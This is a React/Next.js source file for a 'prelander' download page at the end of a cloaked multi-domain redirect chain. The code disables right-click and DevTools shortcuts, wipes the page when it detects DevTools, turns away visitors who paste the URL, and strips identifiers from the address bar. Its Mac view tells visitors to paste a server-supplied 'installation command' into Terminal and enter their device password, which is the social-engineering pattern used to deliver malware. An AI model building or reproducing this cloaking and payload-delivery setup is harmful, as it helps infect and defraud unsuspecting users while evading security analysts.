'use client'

import { useState, useEffect } from 'react'
import { useParams } from 'next/navigation'
import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'

/**
 * Prelander page served on the last domain — /d/[slug]
 *
 * Access-control:
 *  - Slug encodes a timestamp (validated server-side). Expired → blocked.
 *  - Direct access without a valid slug → neutral "not available" page.
 *  - When called from an intermediate domain the backend returns a 302 to
 *    the last domain. The browser follows it transparently; if the hostname
 *    changes we detect it and hard-navigate (handles cross-origin 302s that
 *    fetch's opaque redirect mode would otherwise hide).
 *
 * Redirection flow (spec):
 *  - Bypass OFF: Anchor → Inter (timer dwell on the INTER domain only) → THIS landing page
 *  - Bypass ON:  Anchor → Inter (timer dwell) → Campaign URL (via
 *    bypass_redirect_url from /domain-type — this page never shows)
 *
 * PRELANDER-DOMAIN RULES (spec):
 *  - NO timer on the prelander domain — the dwell runs only on the Inter
 *    domain during its hop. This page never waits artificially.
 *  - NO slug visible EVER: the URL is rewritten to the bare root " /"
 *    immediately on mount, before any data loads.
 *  - SAME-TAB reload works (sessionStorage marker survives reload);
 *    a NEW TAB paste has no marker → about:blank (never a preview).
 *    no preview of any kind (not even "not found").
 */

// ─── CONSOLE BLACKOUT (anti-inspect) ─────────────────────────────────────────
// Module-scoped shadow of the global console: this page must NEVER narrate
// its flow into an open DevTools console (it previously printed handoff
// tokens, prelander domains and campaign data there). Server-side logs are
// unaffected. Kept as a shadow instead of deleting every call site so dev
// debugging can be restored by removing this one block.
const _noop = () => {}
const console = { log: _noop, error: _noop, warn: _noop, info: _noop, debug: _noop } as unknown as Console

// sessionStorage key marking THIS TAB as the one the flow opened the
// prelander in. sessionStorage is PER-TAB: it survives reloads but is empty
// in a new tab — exactly the same-tab-allowed / new-tab-denied distinction.
const TAB_MARKER = 'mpa_prelander_tab'

// Terminal denial (spec: HTTP 204 — no client-side fallback logic).
// The SERVER already answered unauthorized access with 204 No Content
// (middleware shield + backend session-check/resolve). This function exists
// only for paths where the shell somehow mounted anyway (e.g. a page already
// in the browser's back/forward cache from a previously authorized visit,
// or a race where the session expired between shield and mount): it performs
// NO navigation — no about:blank, no history.back(), no window.close, no
// redirects. The page simply renders nothing. The browser's own 204/back
// behavior handles the navigation side.
function denyWithNoPreview(): boolean {
  return false
}

export default function PrelanderSlugPage() {
  const params = useParams()
  // slug == "session" is the CLEAN-URL sentinel: the page was mounted at the
  // bare prelander domain root (https://prelander-domain.com/) and resolves
  // its content entirely from the server-side browsing-session cookie.
  const slug = (params.slug as string) || 'session'
  const [data, setData] = useState<any>(null)
  const [loading, setLoading] = useState(true)
  const [blocked, setBlocked] = useState(false)
  // TERMINAL DENIED state (spec: HTTP 204 semantics — no client-side fallback
  // logic, no error page, no navigation): when the server denies access, the
  // page renders NOTHING. This state exists because the shell may already be
  // mounted (the browser keeps the previous page / a bfcache entry) — we must
  // never paint content or an error screen on top of it.
  const [denied, setDenied] = useState(false)
  const [errorDetails, setErrorDetails] = useState<string>('')
  // True while the browser is transitioning from an Anchor/Inter domain to the
  // Prelander domain. We hold a loader on screen for a short fixed delay so the
  // visitor sees a clean "redirecting…" state rather than a jarring hop.
  const [transitioning, setTransitioning] = useState(false)

  // ═══════════════════════════════════════════════════════════════════════════
  // ANTI-INSPECT LAYER (defense-in-depth — the authorization gate stays
  // server-side; this only removes the casual local inspection shortcuts)
  // ═════════════════════════════════════════════════════════════════════════════
  //  - right-click (context) menu disabled — no "View Page Source" entry
  //  - F12 / Ctrl+Shift+I/J/C / Ctrl+U / Ctrl+S intercepted and swallowed
  //  - DevTools-open detection (debugger-stall heuristic): when DevTools is
  //    attached, the live DOM is wiped so the Elements panel shows nothing
  //  - manual address-bar view-source: is wire-identical to a normal GET —
  //    unauthorized visitors already receive the server's HTTP 204 shield
  //    (nothing at all); authorized visitors view-source only the secret-free
  //    bootstrap shell served by /clean-shell (the middleware rewrites the
  //    clean root there instead of this React app) — the campaign URL,
  //    password and template content arrive via session-validated JSON fetch
  //    and are never embedded in the served HTML.
  useEffect(() => {
    let wiped = false
    const wipe = () => {
      if (wiped) return
      wiped = true
      try { document.documentElement.innerHTML = '' } catch { /* ignore */ }
    }
    const onKey = (e: KeyboardEvent) => {
      const k = (e.key || '').toLowerCase()
      const mod = e.ctrlKey || e.metaKey
      if (
        e.key === 'F12' ||
        (mod && e.shiftKey && (k === 'i' || k === 'j' || k === 'c' || k === 'k')) ||
        (e.metaKey && e.altKey && (k === 'i' || k === 'j' || k === 'c' || k === 'k')) ||
        (mod && k === 'u') ||
        (mod && k === 's')
      ) {
        e.preventDefault()
        e.stopPropagation()
        wipe()
      }
    }
    const onContextMenu = (e: Event) => { e.preventDefault() }
    // Attached at window/document level so the handlers survive the
    // FullHtmlPrelander document.write() (the Document object is reused,
    // the nodes are not).
    window.addEventListener('keydown', onKey, true)
    window.addEventListener('contextmenu', onContextMenu, true)
    document.addEventListener('contextmenu', onContextMenu, true)
    // DevTools-open heuristics (best-effort, survives prod minification + CSP):
    //  1. `debugger` stall — a no-op while DevTools is closed; when open,
    //     execution pauses on it and the measurable delay is the tell. (SWC
    //     may strip bare `debugger` statements in some builds — hence #2.)
    //  2. window-dimension gap — docked DevTools makes outerWidth/Height
    //     exceed innerWidth/Height by the panel size (>160px is far beyond
    //     any scrollbar/zoom delta).
    const timer = window.setInterval(() => {
      if (wiped) { window.clearInterval(timer); return }
      const t0 = performance.now()
      // eslint-disable-next-line no-debugger
      debugger
      const stall = performance.now() - t0 > 120
      const gap =
        window.outerWidth - window.innerWidth > 160 ||
        window.outerHeight - window.innerHeight > 160
      if (stall || gap) wipe()
    }, 1500)
    return () => {
      window.removeEventListener('keydown', onKey, true)
      window.removeEventListener('contextmenu', onContextMenu, true)
      document.removeEventListener('contextmenu', onContextMenu, true)
      window.clearInterval(timer)
    }
  }, [])

  // ═══════════════════════════════════════════════════════════════════════════
  // SECURITY CHECK: Block pasted URLs in new tabs
  // ═══════════════════════════════════════════════════════════════════════════
  // Strategy: Check immediately for denied marker, allow first loads, validate after
  useEffect(() => {
    const SECURITY_MARKER = 'prelander_tab_authorized'
    const existingAuth = sessionStorage.getItem(SECURITY_MARKER)
    
    // If already authorized, allow access
    if (existingAuth === 'granted') {
      console.log('[SECURITY] ✓ Previously authorized tab - access granted')
      return
    }
    
    // If previously denied, go back to previous page immediately
    if (existingAuth === 'denied') {
      console.log('[SECURITY] ✗ Previously denied tab - going back')
      if (window.history.length > 1) {
        window.history.back()
      } else {
        // Fallback if no history - go to Google
        window.location.replace('https://www.google.com')
      }
      return
    }
    
    // First visit - check quickly for obvious pasted URLs
    const referrer = document.referrer
    const historyLength = window.history.length
    
    console.log('[SECURITY] Quick first visit check')
    console.log('[SECURITY] - Referrer:', referrer || '(none)')
    console.log('[SECURITY] - History length:', historyLength)
    
    // If it's clearly a pasted URL (no referrer AND history length = 1), block immediately
    if (!referrer && historyLength === 1) {
      console.log('[SECURITY] ✗ Clear pasted URL - blocking before load')
      sessionStorage.setItem(SECURITY_MARKER, 'denied')
      // Go to Google since there's no previous page
      window.location.replace('https://www.google.com')
      setDenied(true)
      setLoading(false)
      return
    }
    
    // Otherwise allow to proceed - will be validated after load
    console.log('[SECURITY] Allowing page to load for validation')
  }, []) // Empty deps - runs once on mount

  useEffect(() => {
    // Skip data fetch if already denied by security check
    if (denied) {
      console.log('[PRELANDER] Skipping fetch - access denied by security check')
      return
    }

    const fetchData = async () => {
      console.log('[PRELANDER DEBUG] useEffect triggered')
      
      if (!slug) { 
        console.log('[PRELANDER ERROR] No slug provided')
        setDenied(true)
        setLoading(false)
        return 
      }

      const hostname = typeof window !== 'undefined' ? window.location.hostname : ''
      const fullUrl = typeof window !== 'undefined' ? window.location.href : ''

      // ── CLEAN URL MODE (spec) ───────────────────────────────────────────
      // slug == "session": mounted at the bare prelander root. No hop
      // decisions apply — resolve content from the browsing-session cookie.
      if (slug === 'session') {
        // NO SLUG VISIBLE, EVEN WHILE LOADING: scrub the path to the bare
        // root immediately — before any fetch renders anything.
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }

        // SAME-TAB vs NEW-TAB (spec): sessionStorage is PER-TAB. A reload of
        // THIS tab keeps the marker; the same URL pasted into a NEW tab (or
        // any request that never came through the flow) has no marker →
        // show nothing with NO preview of any kind.
        // NOTE: the marker/tab-bridge is DEFENSE-IN-DEPTH only — the SERVER
        // already denies unauthorized visitors at session-check (204) and at
        // the resolve (204). A missing marker therefore must NOT preempt the
        // resolve: an authorized visitor whose bridge cookie was unreadable
        // (e.g. HttpOnly hardening on an old instance) still gets their
        // content from the server-side session. The marker check runs AFTER
        // a successful resolve, purely to stamp the tab for reloads.
        let isSameTab = false
        try { isSameTab = sessionStorage.getItem(TAB_MARKER) === '1' } catch { /* storage blocked → treat as new tab */ }

        // TAB BOOTSTRAP: the /_auth exchange set a one-time 60s bridge cookie.
        // This is the flow's own arrival — consume it NOW and mark THIS tab,
        // so reloads of this tab keep working while pastes elsewhere never do.
        if (!isSameTab) {
          const m = document.cookie.match(/(?:^|;\s*)mpa_tab_ok=1(?:;|$)/)
          if (m) {
            // Consume (expire immediately) — one-time bridge.
            document.cookie = 'mpa_tab_ok=; Max-Age=0; path=/'
            try { sessionStorage.setItem(TAB_MARKER, '1') } catch { /* storage blocked */ }
            isSameTab = true
            console.log('[PRELANDER] Tab bootstrap consumed — this tab is now the flow tab')
          }
        }
        // (isSameTab false here does NOT deny — see NOTE above. The resolve
        // below is the authorization decision; the marker is stamped after it.)

        try {
          const res = await fetch('/api/prelander/resolve/session', {
            headers: { 'X-Prelander-Host': hostname },
          })
          // HTTP 204 = server denied (missing/invalid/expired/tampered
          // authorization). NOTE: 204 is 2xx so res.ok is TRUE — the empty
          // body makes res.json() throw unless we short-circuit here.
          if (res.status === 204 || !res.ok) {
            setDenied(true)
            return
          }
          const json = await res.json()
          if (!json?.success) {
            setDenied(true)
            return
          }
          // Validated by the SERVER — stamp the tab so reloads of THIS tab
          // are recognized; new-tab pastes of the clean root come through
          // session-check/resolve with no cookie and are denied server-side.
          try { sessionStorage.setItem(TAB_MARKER, '1') } catch { /* storage blocked */ }
          // Also consume any lingering bridge cookie (one-time).
          try { document.cookie = 'mpa_tab_ok=; Max-Age=0; path=/' } catch { /* ignore */ }
          // Validated — refresh/reload of this tab keeps working.
          setData(json)
        } catch (error) {
          setDenied(true)
          return
        } finally {
          setLoading(false)
        }
        return
      }

      console.log('[PRELANDER DEBUG] Starting fetch')
      console.log('[PRELANDER DEBUG] - slug:', slug)
      console.log('[PRELANDER DEBUG] - hostname:', hostname)
      console.log('[PRELANDER DEBUG] - full URL:', fullUrl)
      console.log('[PRELANDER DEBUG] - pathname:', typeof window !== 'undefined' ? window.location.pathname : '')

      try{
        console.log('[PRELANDER DEBUG] Step 1: Fetching domain-type')
        // Step 1: check if this hostname is the Prelander domain.
        // If not, redirect the browser to the Prelander domain with the same
        // slug. This avoids fetch() swallowing the 302 from the backend.
        // The slug is passed so the backend can also detect bypass mode and
        // return the Campaign URL directly (bypass ON spec).
        const dtUrl = `/api/prelander/domain-type?host=${encodeURIComponent(hostname)}&slug=${encodeURIComponent(slug)}`
        console.log('[PRELANDER DEBUG] Calling domain-type API:', dtUrl)
        
        const dtRes = await fetch(dtUrl)
        console.log('[PRELANDER DEBUG] domain-type response status:', dtRes.status, dtRes.ok)
        
        if (dtRes.ok) {
          const dt = await dtRes.json()
          console.log('[PRELANDER DEBUG] domain-type data:', JSON.stringify(dt, null, 2))
          
          // Bypass ON (spec): Anchor → Inter (0.75s dwell) → Campaign URL.
          // We're on the Inter domain — hold the 0.75s loader, then go straight
          // to the Campaign URL. The landing page is never shown.
          if (dt.bypass_redirect_url) {
            console.log('[PRELANDER DEBUG] Bypass mode detected, redirecting to:', dt.bypass_redirect_url)
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            window.location.replace(dt.bypass_redirect_url)
            return
          }
          // `last_domain` is the pre-glossary name the API still mirrors.
          const prelanderDomain = dt.prelander_domain ?? dt.last_domain
          console.log('[PRELANDER DEBUG] Prelander domain from API:', prelanderDomain)
          
          // The backend resolves the NEXT managed hop (chain-aware): the next
          // chain hop, the weighted Prelander pool pick, or the legacy
          // publisher/global Prelander domain. It only returns a URL when this
          // host is NOT the final prelander — so trust the returned hop over
          // the domain_type (a prelander-typed domain positioned mid-chain must
          // keep hopping).
          if (prelanderDomain) {
            console.log('[PRELANDER DEBUG] Need to hop to prelander domain:', prelanderDomain)
            // Cross-domain handoff (STEP 4): when leaving the Inter domain for
            // the prelander, mint a one-time handoff and exchange it at
            // /_auth/{handoff} on the prelander domain — the bootstrap consumes
            // it once, sets the prelander-domain HttpOnly session cookie, and
            // lands the visitor on the clean root. Refreshes then ride the
            // session cookie, never the handoff.
            // AUTHORIZATION GATE (spec: no request outside the Anchor flow
            // may see ANYTHING): the handoff mint runs the server-side
            // authorization (click-time session + browser fingerprint + slug
            // binding). A visitor without it — pasted URL, foreign referer,
            // direct hit — gets NO preview, not even a "not found" page, and
            // is sent back to where they came from.
            let handoffToken: string | null = null
            try {
              console.log('[PRELANDER DEBUG] Requesting handoff token')
              const hRes = await fetch(
                `/api/prelander/handoff?slug=${encodeURIComponent(slug)}&target_host=${encodeURIComponent(new URL(prelanderDomain).hostname)}`,
                { headers: { 'X-Prelander-Host': hostname }, redirect: 'manual' }
              )
              console.log('[PRELANDER DEBUG] Handoff response status:', hRes.status, hRes.ok)
              if (hRes.ok) {
                const h = await hRes.json()
                console.log('[PRELANDER DEBUG] Handoff data:', h)
                handoffToken = h?.handoff || null
              } else if (hRes.status === 302 || hRes.status === 301 || hRes.status === 307) {
                // POOL-PICK SELF-HEALING: the backend refused this target (the
                // click was routed to a DIFFERENT prelander domain than the
                // stale /domain-type response suggested) and returned a
                // redirect to the session-recorded host carrying the same
                // slug. Follow it: the correct domain mints the handoff there.
                const hop = hRes.headers.get('location')
                if (hop) {
                  console.log('[PRELANDER DEBUG] Mint redirected to the recorded host — following')
                  setTransitioning(true)
                  await new Promise(r => setTimeout(r, 750))
                  window.location.replace(hop)
                  return
                }
              }
            } catch (handoffError) {
              console.log('[PRELANDER DEBUG] Handoff request failed:', handoffError)
            }

            if (!handoffToken) {
              // NOT authorized (or the mint failed): no preview of any kind —
              // terminal (renders nothing), per spec.
              console.log('[PRELANDER] Unauthorized hop attempt — terminal, no preview')
              setDenied(true)
              return
            }

            // TIMER LIVES ON THE INTER DOMAIN ONLY (spec): the 0.75s dwell
            // runs right here, on the Inter page, during the hop. The
            // prelander domain itself never waits — it loads naturally.
            // ZERO SLUG LEAKAGE (spec Tests C/I): the hop goes to /_auth/{handoff}
            // and lands on the CLEAN ROOT — the slug travels ONLY inside the
            // server-side session binding, never in any public URL. The
            // address bar goes from interdomain/d/{slug} directly to
            // https://prelanderdomain.com/ with nothing in between.
            console.log('[PRELANDER DEBUG] Got handoff token, redirecting after 0.75s dwell')
            setTransitioning(true)
            await new Promise(r => setTimeout(r, 750))
            const authUrl = `${prelanderDomain}/_auth/${handoffToken}`
            console.log('[PRELANDER DEBUG] Redirecting to clean-root handoff:', authUrl.replace(/\/_auth\/\S+/, '/_auth/{token}'))
            window.location.replace(authUrl)
            return
          }
          
          console.log('[PRELANDER DEBUG] No prelander domain, staying on current host')
        } else {
          console.log('[PRELANDER DEBUG] domain-type API failed with status:', dtRes.status)
        }

        // Step 2: on the Prelander domain (or type unknown) — fetch prelander data
        console.log('[PRELANDER DEBUG] Step 2: Fetching prelander data')
        const resolveUrl = `/api/prelander/resolve/${slug}`
        console.log('[PRELANDER DEBUG] Calling resolve API:', resolveUrl)
        
        const res = await fetch(resolveUrl, {
          headers: { 'X-Prelander-Host': hostname },
        })
        
        console.log('[PRELANDER DEBUG] Resolve response status:', res.status, res.ok)

        // HTTP 204 = server denied (204 is 2xx so res.ok is TRUE — handle it
        // BEFORE res.ok/json parsing, the empty body breaks res.json()).
        if (res.status === 204 || !res.ok) {
          console.log('[PRELANDER ERROR] Resolve rejected — terminal, no preview')
          setDenied(true)
          return
        }

        const json = await res.json()
        console.log('[PRELANDER DEBUG] Resolve data:', JSON.stringify(json, null, 2))
        
        if (!json?.success) {
          console.log('[PRELANDER ERROR] Resolve returned success=false — terminal')
          setDenied(true)
          return
        }

        console.log('[PRELANDER SUCCESS] Setting prelander data')
        setData(json)
        // CLEAN FINAL URL (spec): the visible prelander address must be
        // https://prelander-domain.com/ — no slug, no ids, and rewritten
        // IMMEDIATELY (before this render paints the data) so the slug is
        // never visible even during loading. From here refreshes ride the
        // browsing-session cookie (the /d/session route), not the slug.
        if (typeof window !== 'undefined' && window.location.pathname.startsWith('/d/')) {
          window.history.replaceState({}, '', '/')
        }
      } catch (error) {
        console.error('[PRELANDER ERROR] Exception in fetchData:', error)
        // Terminal denied — render nothing, never the error page.
        setDenied(true)
        setErrorDetails(error instanceof Error ? error.message : 'Unknown error')
      } finally {
        console.log('[PRELANDER DEBUG] Fetch complete, loading=false')
        setLoading(false)
      }
    }
    fetchData()
  }, [slug, denied])

  useEffect(() => {
    document.title = 'Download Ready'
  }, [])

  // Post-load security check: Mark tab as authorized or deny based on referrer
  useEffect(() => {
    if (data && !denied) {
      const SECURITY_MARKER = 'prelander_tab_authorized'
      const existingAuth = sessionStorage.getItem(SECURITY_MARKER)
      
      if (!existingAuth) {
        // First successful load - validate referrer
        const referrer = document.referrer
        const currentHost = window.location.hostname
        const hasExternalReferrer = referrer && !referrer.includes(currentHost)
        
        console.log('[SECURITY] Post-load validation')
        console.log('[SECURITY] - Referrer:', referrer || '(none)')
        console.log('[SECURITY] - Has external referrer:', hasExternalReferrer)
        
        if (hasExternalReferrer) {
          // Legitimate redirect flow - authorize this tab
          sessionStorage.setItem(SECURITY_MARKER, 'granted')
          console.log('[SECURITY] ✓ Tab authorized - legitimate redirect flow')
        } else {
          // Pasted URL that somehow loaded - deny and go back
          sessionStorage.setItem(SECURITY_MARKER, 'denied')
          console.log('[SECURITY] ✗ Pasted URL detected - going back to previous page')
          
          // Go back to previous page (e.g., Wikipedia)
          if (window.history.length > 1) {
            window.history.back()
          } else {
            // Fallback if no history
            window.location.replace('https://www.google.com')
          }
        }
      }
    }
  }, [data, denied])

  // Terminal denied state — render NOTHING (spec: no error page, no content,
  // no loader). The server's 204 semantics are honored by leaving the page
  // empty; the browser's native handling takes care of the rest.
  if (denied) {
    return null
  }

  // Simple professional loader — shown during the data fetch and during the
  // 0.75s Inter-domain dwell. Nothing extra: one spinner, one line of text.
  if (loading || transitioning) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f7f8fa]">
        <div className="flex flex-col items-center gap-4">
          <div className="w-8 h-8 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
          <p className="text-sm text-gray-500">
            {transitioning ? 'Redirecting…' : 'Loading…'}
          </p>
        </div>
      </div>
    )
  }

  // Terminal denied (no data after a completed fetch) — render NOTHING.
  // Spec: never an application error page, never content, never a loader.
  if (!data) {
    return null
  }

  // Note: Bypass OFF always shows the landing page — even when the backend has
  // no active template (the built-in layout renders as fallback). The visitor
  // is only forwarded straight to the campaign URL when Bypass is ON, which
  // happens earlier via `bypass_redirect_url` from /domain-type.

  // Admin pasted a complete HTML template → the backend already rendered it
  // server-side ({Campaign_URL} / {Password} shortcodes substituted). Serve it
  // as a full-page document instead of the built-in layouts.
  if (data.rendered_html) return <FullHtmlPrelander html={data.rendered_html} />

  if (data.os === 'mac') return <MacPrelander data={data} />
  return <WindowsPrelander data={data} />
}

/* ─── Full HTML: server-rendered custom template ─────────────────────────── */
function FullHtmlPrelander({ html }: { html: string }) {
  useEffect(() => {
    // Replace the whole document so <!DOCTYPE html>, <head> styles and the
    // template's scripts behave exactly as the admin authored them.
    document.open()
    document.write(html)
    document.close()
  }, [html])
  return null
}

/* ─── Windows Prelander ──────────────────────────────────────────────────── */
function WindowsPrelander({ data }: { data: any }) {
  const [copied, setCopied] = useState(false)
  // Template customisation fields resolved by the backend (assigned template
  // or OS default); fall back to the historical copy when no template data.
  const tpl = data?.template
  const title = tpl?.title ?? 'Your file is ready to download'
  const subtitle = tpl?.subtitle ?? 'Your file is prepared. Copy the link to download.'
  const buttonText = tpl?.button_text ?? 'Copy'

  const handleCopy = () => {
    if (data?.offer_url) {
      navigator.clipboard.writeText(data.offer_url).catch(() => {})
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f0f2f5]">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-green-100 mx-auto mb-4 flex items-center justify-center">
              <FileDown size={26} className="text-green-600" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
            <p className="text-sm text-gray-500 mt-2">{subtitle}</p>
          </div>

          <div className="px-6 pb-4">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Download Link</label>
            <div className="flex items-center gap-2 bg-gray-50 border border-gray-200 rounded-xl p-1">
              <div className="flex-1 px-3 py-2.5 text-sm text-gray-700 font-mono truncate select-all">
                {data.offer_url}
              </div>
              <button onClick={handleCopy}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copied ? 'bg-green-600 text-white' : 'bg-gray-900 text-white hover:bg-gray-800'
                }`}>
                {copied ? <><Check size={14} /> Copied</> : <><Copy size={14} /> {buttonText}</>}
              </button>
            </div>
          </div>

          {data.password && (tpl?.show_password_field ?? true) && (
            <div className="px-6 pb-4">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}

          <div className="px-6 pb-8" />
        </div>
        <p className="text-center text-xs text-gray-400 mt-4">Secure file hosting service</p>
      </div>
    </div>
  )
}

/* ─── Mac Prelander ──────────────────────────────────────────────────────── */
function MacPrelander({ data }: { data: any }) {
  const [copiedCmd, setCopiedCmd] = useState(false)
  const installCommand = data.offer_url || ''
  // Template customisation fields — same source as the Windows prelander.
  const tpl = data?.template
  const title = tpl?.title ?? 'How to open Terminal on Mac'

  const handleCopyCmd = () => {
    navigator.clipboard.writeText(installCommand).catch(() => {})
    setCopiedCmd(true)
    setTimeout(() => setCopiedCmd(false), 2000)
  }

  return (
    <div className="min-h-screen bg-[#f5f5f7] flex flex-col items-center p-4 py-10">
      <div className="w-full max-w-2xl space-y-6">

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-8 pb-5 text-center">
            <div className="w-14 h-14 rounded-full bg-gray-900 mx-auto mb-4 flex items-center justify-center">
              <Terminal size={26} className="text-green-400" />
            </div>
            <h1 className="text-xl font-bold text-gray-900">{title}</h1>
          </div>

          <div className="px-6 pb-5">
            <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Installation Command</label>
            <div className="flex items-center gap-2 bg-gray-900 rounded-xl p-1">
              <div className="flex-1 px-3 py-3 text-sm text-green-400 font-mono truncate select-all">
                <span className="text-gray-500 mr-1">$</span> {installCommand}
              </div>
              <button onClick={handleCopyCmd}
                className={`flex-shrink-0 flex items-center gap-1.5 px-4 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                  copiedCmd ? 'bg-green-600 text-white' : 'bg-gray-700 text-white hover:bg-gray-600'
                }`}>
                {copiedCmd ? <><Check size={14} /> Copied</> : <><Copy size={14} /> Copy</>}
              </button>
            </div>
          </div>

          <div className="px-6 pb-6">
            <div className="space-y-3">
              {[
                <>Press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">⌘</kbd> + <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Space</kbd> to open Spotlight Search.</>,
                <>Type <strong>&quot;Terminal&quot;</strong> and press <kbd className="px-1.5 py-0.5 bg-gray-100 border border-gray-300 rounded text-xs font-mono">Return</kbd> to launch it.</>,
                <>Once the Terminal window is open, proceed with the steps below.</>,
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-blue-100 text-blue-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Installation via Terminal command</h2>
          </div>
          <div className="px-6 pb-6">
            <div className="space-y-3 mt-3">
              {[
                'Copy the installation command above.',
                <>Open the terminal and paste the command, then press <strong>&quot;Return&quot;</strong>.</>,
                'Enter your device password and confirm the installation.',
              ].map((step, i) => (
                <div key={i} className="flex gap-3">
                  <div className="flex-shrink-0 w-7 h-7 rounded-full bg-green-100 text-green-700 flex items-center justify-center text-sm font-bold">{i + 1}</div>
                  <p className="text-sm text-gray-700 pt-1">{step}</p>
                </div>
              ))}
            </div>
          </div>

          {data.password && (
            <div className="px-6 pb-6">
              <label className="block text-xs font-semibold text-gray-500 uppercase tracking-wide mb-2">Device Password</label>
              <div className="flex items-center gap-3 bg-amber-50 border border-amber-200 rounded-xl px-4 py-3">
                <Lock size={16} className="text-amber-500 flex-shrink-0" />
                <span className="text-base font-bold font-mono tracking-widest text-amber-800 select-all">{data.password}</span>
              </div>
            </div>
          )}
        </div>

        <div className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden">
          <div className="px-6 pt-6 pb-2">
            <h2 className="text-lg font-bold text-gray-900">Video Tutorial</h2>
            <p className="text-sm text-gray-500 mt-1">Watch the step-by-step guide below</p>
          </div>
          <div className="px-6 pb-6 pt-3">
            <div className="relative w-full aspect-video bg-black rounded-xl overflow-hidden">
              <video className="w-full h-full" controls playsInline autoPlay muted loop preload="auto" src="/terminal.mp4" />
            </div>
          </div>
        </div>

        <p className="text-center text-xs text-gray-400 pb-4">Secure installation service</p>
      </div>
    </div>
  )
}
